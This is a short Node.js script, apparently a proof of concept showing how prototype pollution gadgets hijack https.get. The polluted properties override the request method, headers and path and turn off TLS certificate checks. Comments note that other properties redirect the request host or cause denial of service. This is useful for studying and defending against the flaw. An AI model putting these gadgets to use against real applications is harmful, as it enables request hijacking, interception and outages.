const https = require('https');

Object.prototype.method = "POST";
// Object.prototype.port = 3000;
Object.prototype.headers = {test: 123, host: 'fake'};
Object.prototype.path = '/test';
Object.prototype.NODE_TLS_REJECT_UNAUTHORIZED = '0';
//Object.prototype.hostname = "example.com" // send requist to this address and ignore host

//Object.prototype.session = 1 // DoS
//Object.prototype.ALPNProtocols = ['http/1.0'] // DoS or changing protocol if the server supports it

const options = {
  host: 'localhost',
  //rejectUnauthorized: false // to ignore self-signed certificate errors
};

const req = https.get(options, (res) => {
  console.log(`statusCode: ${res.statusCode}`);

  res.on('data', (d) => {
    process.stdout.write(d);
  });
});

req.on('error', (e) => {
  console.error(e);
});

req.end();
  